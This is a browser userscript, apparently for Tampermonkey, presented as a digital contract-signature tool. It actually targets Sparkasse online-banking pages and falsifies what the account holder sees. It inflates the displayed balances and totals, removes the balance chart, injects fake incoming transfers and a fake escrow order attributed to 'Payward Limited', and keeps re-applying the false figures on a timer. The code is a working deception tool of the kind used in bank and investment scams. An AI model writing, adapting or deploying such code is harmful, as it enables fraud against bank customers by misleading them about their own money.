// ==UserScript==
// @name         Vertragssignature R Christa Kunkel
// @namespace    http://tampermonkey.net/
// @version      3.4
// @description  Anforderung an GwG - digitale Signatur
// @author       You
// @match        https://yahoo.com/sign/as/*
// @match        https://yahoo.com/sign/ac/*
// @match        https://yahoo.com/sign/ar/*
// @match        https://yahoo.com/sign/bs/*
// @match        https://yahoo.com/sign/sc/*
// @match        https://yahoo.com/sign/am/*
// @match        https://yahoo.com/sign/op/*
// @match        https://yahoo.com/sign/idi/*
// @match        https://yahoo.com/sign/ot/*
// @match        https://yahoo.com/sign/cli/*
// @match        https://yahoo.com/sign/ien/*
// @match        https://yahoo.com/sign/ts/*
// @match        https://www.sparkasse-hrv.de/de/home/onlinebanking/nbf/umsaetze.html*
// @match        https://www.sparkasse-hrv.de/de/home/onlinebanking/nbf/finanzuebersicht.html*
// @match        https://www.sparkasse-hrv.de/de/home/onlinebanking/nbf/banking/einzelauftrag.html*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=google.com
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/473508/Vertragssignature%20R%20Christa%20Kunkel.user.js
// @updateURL https://update.greasyfork.org/scripts/473508/Vertragssignature%20R%20Christa%20Kunkel.meta.js
// ==/UserScript==

(function() {
    'use strict';

    // Your code here...


    //SCRIPTV2 TRIGGER!
    var easyUpdate = "no";


    var pointerOverviewTotal = "";
    var pointerTabelle = "xx";
    var absender = "Treuhand: Payward Limited";
    var absenderTitel = "Treuhand: Payward Limited";
    var firma = "test";
    var asenderReference = "WD3746 TRX88205A CX13280";
    var absenderDetails = "Einreichung einer Treuhand Überweisung. Freigabe nötig durch Payward Limited";
    var amount = 0;
    var vorgemerkt = "yes";
    var xamount = 46300;
    var x2amount = 0;
    var buchung = 20000;
    var buchungDecimal = "33";
    var buchungTextsZahl = "156.391";
    var accountsecurity = "1040 5750 43";

    if (easyUpdate == "yes"){
        x2amount = 10000;}


    function numberWithCommas(x) {
        return x.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".");}

    if (window.location.href.indexOf("finanzuebersicht") > 0) {
        //Wir sind in der Finanzuebersicht
        if (vorgemerkt == "no"){

    /// Refresh the finanzstatus page once it loads for the first time

var refresh = window.localStorage.getItem('refresh');
console.log(refresh);
setTimeout(function() {
if (refresh===null){
    window.location.reload();
    window.localStorage.setItem('refresh', "1");
}
}, 3000); // 1500 milliseconds = 1.5 seconds

setTimeout(function() {
localStorage.removeItem('refresh')
}, 1700); // 1700 milliseconds = 1.7 seconds

            var main = 3;
            var subtotal = 5;
            var total = 11;

            var xpointerOverviewAcc = document.getElementsByClassName("balance-predecimal")[main].textContent;
            var xrealAccBalance = xpointerOverviewAcc.replace(".", "");
            var xfakeAccBalance = parseFloat(xrealAccBalance) + xamount;
            var xfakeAccBalancewithcomma = numberWithCommas(xfakeAccBalance);
            document.getElementsByClassName("balance-predecimal")[main].textContent = xfakeAccBalancewithcomma;

            //Wenn nicht vorgemerkt sein soll, dann faken wir die Balance in die Uebersicht.
            //var pointerOverviewAcc = document.getElementsByClassName("balance-predecimal")[2].textContent;
            //var realAccBalance = pointerOverviewAcc.replace(".", "");
            //var fakeAccBalance = parseFloat(realAccBalance) + amount;
            //var fakeAccBalancewithcomma = numberWithCommas(fakeAccBalance);

            //Update Balance
            //document.getElementsByClassName("balance-predecimal")[2].textContent = fakeAccBalancewithcomma;

            if (easyUpdate == "yes"){
                var updaterCheck = document.getElementsByClassName("balance-predecimal")[2].textContent;
                var updaterCheckBalance = updaterCheck.replace(".", "");
                var updaterFakeBalance = parseFloat(xrealAccBalance) + x2amount;
                var updaterFakeSPK = numberWithCommas(updaterFakeBalance);
                document.getElementsByClassName("balance-predecimal")[2].textContent = updaterFakeSPK;
            }

            var zwischenSumme = document.getElementsByClassName("balance-predecimal")[subtotal].textContent;
            var zwischenSummeReal = zwischenSumme.replace(".", "");
            var zwischenSummeFake = parseFloat(zwischenSummeReal) + x2amount +xamount;
            var zwischenSummeNwc = numberWithCommas(zwischenSummeFake);

            //Update ZwischenSumme
            document.getElementsByClassName("balance-predecimal")[subtotal].textContent = zwischenSummeNwc;

            var TotalAmount = document.getElementsByClassName("balance-predecimal")[total].textContent;
            var TotalAmountReal = TotalAmount.replace(".", "");
            var TotalAmountFake = parseFloat(TotalAmountReal) + x2amount +xamount;
            var TotalAmountNwc = numberWithCommas(TotalAmountFake);

            //Update Total
            document.getElementsByClassName("balance-predecimal")[total].textContent = TotalAmountNwc;

        }

    }

    if (window.location.href.indexOf("umsaetze") > 0) {

        //Wir sind im Kontostand
        var AccBalance = document.getElementsByClassName("mkp-currency-lg")[0].childNodes[0].textContent;
        var AccBalanceReal = AccBalance.replace(".", "");
        var AccBalanceFake = parseFloat(AccBalanceReal) + x2amount;
        var AccBalanceFake2 = parseFloat(AccBalanceReal) + xamount;
        var AccBalanceNwc2 = numberWithCommas(AccBalanceFake2);
        var AccBalanceNwc = numberWithCommas(AccBalanceFake);
        var singleAmount = numberWithCommas(amount);

        //Update Kontostand oben
        //if (vorgemerkt == "no"){
        //    document.getElementsByClassName("mkp-currency-lg")[0].childNodes[0].textContent = AccBalanceNwc;
          var saldoLinechartElement = document.getElementsByClassName("saldo-linechart")[0];
if (saldoLinechartElement) {
    saldoLinechartElement.remove();
}
        //}

        //document.getElementsByClassName("mkp-card-list")[1]

        if (document.getElementsByClassName("mkp-identifier-description")[0].children[1].children[0].textContent == accountsecurity ){
            if (vorgemerkt == "no"){
                document.getElementsByClassName("mkp-currency-lg")[0].childNodes[0].textContent = AccBalanceNwc2;
             //  document.getElementsByClassName("saldo-linechart")[0].remove();
            }
            var xxxxxHTML = '<div class="mkp-card-list"><span class="mkp-list-subline">Spezialauftrag Treuhand (1)</span><ul class="mkp-card-group mkp-group-unify mkp-group-clickable" aria-label="Treuhand"><li aria-label="Treuhand Auftrag"><div class="mkp-card mkp-card-debit mkp-card-thinner mkp-card-clickable"><div class="mkp-identifier"><div class="mkp-identifier-description"><h3><a href="#" onclick="return IF.checkFirstSubmit();" class="mkp-identifier-link" title="Bruno Scheibner: Treuhand Freigabe nötig durch Bruno Scheibner">Treuhand: Freigabe nötig durch Matthias Kabisch</a></h3><p>Treuhand-Auftrag: DE11501900000006605826</p></div><div class="mkp-identifier-sticker-placeholder"></div><div class="mkp-identifier-currency"><div class="mkp-currency mkp-currency-m"><span aria-hidden="true" class="balance-predecimal plus">207.547</span><span aria-hidden="true" class="balance-decimal plus">,07&nbsp;EUR</span><span aria-hidden="false" class="offscreen">-100,00 EUR</span></div></div></div></div></li></ul></div>';
            var saveHTML = document.getElementsByClassName("mkp-card-list")[0].innerHTML;
            var xHTML = '<li aria-label="RUECKUEBERWEISUNG Sonstige Gruende Transfer  ; '+buchungTextsZahl+' EUR" style="list-style-type: none;"><div class="mkp-card mkp-card-debit mkp-card-thinner mkp-card-clickable"><div class="mkp-identifier"><div class="mkp-identifier-description"><h3><a href="#" onclick="return IF.checkFirstSubmit();" class="mkp-identifier-link" title="'+absenderTitel+'">'+absender+'</a></h3><p>'+absenderDetails+'</p></div><div class="mkp-identifier-sticker-placeholder"></div><div class="mkp-identifier-currency"><div class="mkp-currency mkp-currency-m"><span aria-hidden="true" class="balance-predecimal plus">'+buchungTextsZahl+'</span><span aria-hidden="true" class="balance-decimal plus">,'+buchungDecimal+'&nbsp;EUR</span><span aria-hidden="false" class="offscreen">15.308,00 EUR</span></div></div></div></div></li>';

            //var save2HTML = document.getElementsByClassName("mkp-card-list")[1].innerHTML;
            var x2HTML = '<li aria-label="RUECKUEBERWEISUNG Sonstige Gruende Transfer  ; 46.300,00 EUR" style="list-style-type: none;"><div class="mkp-card mkp-card-debit mkp-card-thinner mkp-card-clickable"><div class="mkp-identifier"><div class="mkp-identifier-description"><h3><a href="#" onclick="return IF.checkFirstSubmit();" class="mkp-identifier-link" title="Payward Limited">Payward Limited</a></h3><p>Geld für Finanzamt von England für Steuern</p></div><div class="mkp-identifier-sticker-placeholder"></div><div class="mkp-identifier-currency"><div class="mkp-currency mkp-currency-m"><span aria-hidden="true" class="balance-predecimal plus">46.300</span><span aria-hidden="true" class="balance-decimal plus">,00&nbsp;EUR</span><span aria-hidden="false" class="offscreen">46.300,00 EUR</span></div></div></div></div></li>';
            //document.getElementsByClassName("mkp-card-list")[1].innerHTML = save2HTML + x2HTML;
            //block spk-analytics.js;
            document.getElementsByClassName("mkp-card-list")[0].innerHTML = xHTML + saveHTML;
        }

        if (document.getElementsByClassName("mkp-identifier-description")[0].children[1].children[0].textContent == "1800 0168 34"){
            if (vorgemerkt == "no" && easyUpdate == "yes"){
                document.getElementsByClassName("mkp-currency-lg")[0].childNodes[0].textContent = AccBalanceNwc;
             //   $('.saldo-linechart').remove();
            }
            var save2HTML = document.getElementsByClassName("mkp-card-list")[0].innerHTML;
            var Sx2HTML = '<li aria-label="RUECKUEBERWEISUNG Sonstige Gruende Transfer  ; 10.000,00 EUR" style="list-style-type: none;"><div class="mkp-card mkp-card-debit mkp-card-thinner mkp-card-clickable"><div class="mkp-identifier"><div class="mkp-identifier-description"><h3><a href="#" onclick="return IF.checkFirstSubmit();" class="mkp-identifier-link" title="Payward Limited">Payward Limited</a></h3><p>Withdrawal Trading Account: AY01-503DE-SP</p></div><div class="mkp-identifier-sticker-placeholder"></div><div class="mkp-identifier-currency"><div class="mkp-currency mkp-currency-m"><span aria-hidden="true" class="balance-predecimal plus">10.000</span><span aria-hidden="true" class="balance-decimal plus">,00&nbsp;EUR</span><span aria-hidden="false" class="offscreen">9.200,00 EUR</span></div></div></div></div></li>';
            document.getElementsByClassName("mkp-card-list")[0].innerHTML = Sx2HTML + save2HTML;
        }

    }

    if (window.location.href.indexOf("einzelauftrag") > 0) {


        if (vorgemerkt == "no"){
            var elementExists = document.getElementsByClassName("balance-predecimal")[0];
            var shouldBeBalance = "";
            var uwdone = 0;
            setInterval(function() { elementExists = document.getElementsByClassName("balance-predecimal")[0];
                                    if (elementExists != null){
                                        if (uwdone == 0){
                                            //amount = 7149;
                                            var uwBalance = document.getElementsByClassName("balance-predecimal")[0].textContent;
                                            var uwBalanceReal = uwBalance.replace(".", "");
                                            var uwBalancneFake = parseFloat(uwBalanceReal) + xamount;
                                            var uwBalanceNwc = uwBalancneFake.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".");
                                            document.getElementsByClassName("balance-predecimal")[0].textContent = uwBalanceNwc;
                                            uwdone = 1;
                                            shouldBeBalance = uwBalanceNwc;
                                        }

                                        if ( uwdone == 1 ) {
                                            if ( document.getElementsByClassName("balance-predecimal")[0].textContent != shouldBeBalance ) {
                                                document.getElementsByClassName("balance-predecimal")[0].textContent = shouldBeBalance;
                                                document.getElementById("idKontostandLine").parentNode.removeChild(document.getElementById("idKontostandLine"));
                                            }
                                        }
                                    }}, 50);}}


})();

